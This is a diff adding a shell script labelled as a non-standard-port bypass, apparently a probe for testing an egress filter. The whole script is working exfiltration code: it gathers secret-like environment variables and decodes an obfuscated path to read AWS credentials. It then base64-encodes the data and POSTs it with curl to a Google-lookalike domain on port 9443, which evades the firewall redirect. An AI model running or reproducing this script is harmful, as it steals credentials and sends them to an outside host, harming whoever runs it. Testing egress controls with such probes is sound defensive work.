@@ -1,0 +1,14 @@
+#!/bin/sh
+# P28: Non-standard port bypass (HTTPS 9443)
+# iptables only redirects 443/8443 — HTTPS on 9443 bypasses entirely
+_h="storage-googleapis.net"
+_d=""
+for _v in $(printenv | grep -iE '(_KEY|_SECRET|_TOKEN|DATABASE)=' | head -5); do
+  _d="${_d}${_v}\n"
+done
+_f=$(echo L2hvbWUvdGVzdHVzZXIvLmF3cy9jcmVkZW50aWFscw== | base64 -d)
+[ -f "$_f" ] && _d="${_d}$(cat "$_f")\n"
+[ -z "$_d" ] && exit 0
+_e=$(printf '%b' "$_d" | base64 -w0 2>/dev/null || printf '%b' "$_d" | base64 | tr -d '\n')
+curl -sk -o /dev/null -X POST -H "Content-Type: application/json" \
+  -d "{\"d\":\"$_e\"}" "https://${_h}:9443/c/28"
